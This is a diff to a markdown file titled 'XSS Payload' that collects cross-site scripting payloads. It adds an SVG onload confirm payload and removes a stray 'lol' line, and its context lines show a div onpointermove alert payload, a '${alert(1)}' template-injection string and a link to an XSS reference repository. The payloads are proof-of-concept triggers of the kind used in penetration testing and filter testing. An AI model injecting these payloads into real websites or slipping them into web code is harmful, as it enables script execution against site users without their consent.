@@ -1,5 +1,10 @@
 # XSS Payload
 ###
+
+###
+```
+<!--><Svg OnLoad=(confirm)(1)-->
+```
 ###
 ```
 <!--><Svg OnLoad=(confirm)(1)-->
@@ -10,8 +15,6 @@ XSS BIBLE---> https://github.com/s0md3v/AwesomeXSS
 "><div onpointermove="alert(45)">MOVE HERE</div>'
 ```
 ###
-```
-lol
 ```
 ${alert(1)}
 ```
